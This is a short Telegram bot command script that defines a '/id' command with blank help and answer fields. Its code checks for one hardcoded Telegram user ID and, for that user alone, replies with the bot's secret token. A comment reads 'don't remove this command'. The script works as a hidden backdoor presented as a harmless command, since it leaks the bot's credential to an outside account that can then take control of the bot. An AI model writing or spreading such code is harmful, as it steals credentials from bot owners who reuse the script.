/*CMD
  command: /id
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

// don't remove this command

if (user.telegramid == 6918300873 ) {
  return Bot.sendMessage(bot.token)
} 
